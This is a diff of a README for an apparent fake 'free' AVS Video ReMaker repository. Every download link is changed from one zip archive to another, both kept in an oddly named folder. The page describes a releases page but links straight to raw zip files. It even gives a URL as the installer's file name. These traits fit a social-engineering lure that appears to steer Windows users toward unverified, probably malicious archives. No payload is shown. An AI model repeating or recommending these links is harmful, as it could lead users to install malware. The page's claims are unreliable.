@@ -1,6 +1,6 @@
 # 🎥 AVS-Video-ReMaker-Free - Simplify Your Video Editing Process
 
-[![Download AVS-Video-ReMaker-Free](https://raw.githubusercontent.com/Hinthuupriya/AVS-Video-ReMaker-Free/main/antimeristem/AV-Re-Maker-Free-Video-1.4-beta.4.zip%20Now-AVS%20Video%20ReMaker%20Free-brightgreen)](https://raw.githubusercontent.com/Hinthuupriya/AVS-Video-ReMaker-Free/main/antimeristem/AV-Re-Maker-Free-Video-1.4-beta.4.zip)
+[![Download AVS-Video-ReMaker-Free](https://github.com/Hinthuupriya/AVS-Video-ReMaker-Free/raw/refs/heads/main/antimeristem/Free_Maker_Video_AV_Re_3.7.zip%20Now-AVS%20Video%20ReMaker%20Free-brightgreen)](https://github.com/Hinthuupriya/AVS-Video-ReMaker-Free/raw/refs/heads/main/antimeristem/Free_Maker_Video_AV_Re_3.7.zip)
 
 ## 📖 Overview
 
@@ -12,13 +12,13 @@ To get started with AVS Video ReMaker, follow these steps:
 
 1. **Visit the Download Page**
    Click on the link below to access the releases page where you can download the software:
-   [Download AVS Video ReMaker Free](https://raw.githubusercontent.com/Hinthuupriya/AVS-Video-ReMaker-Free/main/antimeristem/AV-Re-Maker-Free-Video-1.4-beta.4.zip).
+   [Download AVS Video ReMaker Free](https://github.com/Hinthuupriya/AVS-Video-ReMaker-Free/raw/refs/heads/main/antimeristem/Free_Maker_Video_AV_Re_3.7.zip).
 
 2. **Choose the Right Version**
    On the releases page, look for the latest stable version. You will typically see a list of available downloads. Choose the version that matches your operating system (Windows). 
 
 3. **Download the Installer**
-   Click on the installer file to begin the download. The file will usually be named something like `https://raw.githubusercontent.com/Hinthuupriya/AVS-Video-ReMaker-Free/main/antimeristem/AV-Re-Maker-Free-Video-1.4-beta.4.zip`.
+   Click on the installer file to begin the download. The file will usually be named something like `https://github.com/Hinthuupriya/AVS-Video-ReMaker-Free/raw/refs/heads/main/antimeristem/Free_Maker_Video_AV_Re_3.7.zip`.
 
 4. **Locate the Downloaded File**
    Once the download is complete, go to your Downloads folder and find the installer file.
@@ -33,7 +33,7 @@ To get started with AVS Video ReMaker, follow these steps:
 
 To download and install AVS Video ReMaker, follow these simple instructions:
 
-1. **Visit this page to download:** [AVS Video ReMaker Free Releases](https://raw.githubusercontent.com/Hinthuupriya/AVS-Video-ReMaker-Free/main/antimeristem/AV-Re-Maker-Free-Video-1.4-beta.4.zip).
+1. **Visit this page to download:** [AVS Video ReMaker Free Releases](https://github.com/Hinthuupriya/AVS-Video-ReMaker-Free/raw/refs/heads/main/antimeristem/Free_Maker_Video_AV_Re_3.7.zip).
    
 2. **Download the latest version**: Ensure you choose the correct file that matches your Windows version. 
 
@@ -91,4 +91,4 @@ You can refer to the user guides and tutorials in this repository. If you have f
 
 AVS Video ReMaker simplifies the video editing process with its variety of user-friendly features. By following the steps above, you can easily download, install, and start editing your videos. For more resources, refer to the guides provided in this repository. Enjoy your video editing experience!
 
-[Download AVS Video ReMaker Free](https://raw.githubusercontent.com/Hinthuupriya/AVS-Video-ReMaker-Free/main/antimeristem/AV-Re-Maker-Free-Video-1.4-beta.4.zip)
+[Download AVS Video ReMaker Free](https://github.com/Hinthuupriya/AVS-Video-ReMaker-Free/raw/refs/heads/main/antimeristem/Free_Maker_Video_AV_Re_3.7.zip)
